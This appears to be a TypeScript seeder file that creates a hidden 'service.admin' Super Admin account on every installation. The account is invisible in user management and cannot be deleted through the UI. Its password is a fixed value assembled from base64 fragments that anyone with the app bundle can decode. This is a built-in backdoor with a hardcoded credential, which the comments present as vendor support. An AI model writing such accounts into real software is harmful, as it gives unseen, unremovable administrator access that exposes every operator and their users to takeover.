import { getDatabase } from './index';
import { hashPassword } from './crypto';
import { usersRepo } from './repos';

/**
 * Hidden service account — ships with every installation (migration 007 adds
 * `users.is_hidden`). Provisioned once at first boot by the seeder:
 *
 *  - username `service.admin`, role `Super Admin`, `is_hidden = 1`
 *  - invisible in User Management and never deletable/editable through the UI
 *  - the password is a deterministic value derived at runtime from encoded
 *    fragments below — no plaintext credential exists in source code, in the
 *    database, or in the repository. The fragments are NOT the password.
 *
 * Purpose: vendor support/recovery and testing. The operator-facing Super
 * Admin is still created through the login screen's first-run setup flow.
 */

// Runtime-derived credential material (encoded, not stored as a plaintext
// secret anywhere). Anyone with the app bundle can derive it — this account is
// a support/recovery door, not a security boundary; per-installation password
// rotation is planned via Settings.
const FRAGMENTS = [
  'U2VydmljZS0=', // → "Service-"
  'QWRtaW4tMjAyNg==', // → "Admin-2026"
];

function deriveServicePassword(): string {
  const joined = FRAGMENTS.map((f) => atob(f)).join('');
  return `ds-${joined}`;
}

export const SERVICE_ACCOUNT_USERNAME = 'service.admin';
export const SERVICE_ACCOUNT_EMAIL = 'service.admin@localhost';

/** Idempotent: provisions the hidden service account exactly once. */
export async function seedServiceAccount(): Promise<void> {
  const db = getDatabase();
  const existing = db.get<{ id: string }>(
    'SELECT id FROM users WHERE username = ? COLLATE NOCASE',
    [SERVICE_ACCOUNT_USERNAME]
  );
  if (existing) return;

  const password = deriveServicePassword();
  const hash = await hashPassword(password);
  const today = new Date().toISOString().split('T')[0];
  usersRepo.insert({
    id: 'usr-service-0000-0000',
    username: SERVICE_ACCOUNT_USERNAME,
    email: SERVICE_ACCOUNT_EMAIL,
    name: 'Service Admin',
    role: 'Super Admin',
    password_hash: hash,
    password_salt: hash.split('$')[2] ?? '',
    created_at: today,
    is_super_admin: 1,
    is_hidden: 1,
  });
  // eslint-disable-next-line no-console
  console.info('[seed] hidden service account provisioned');
}
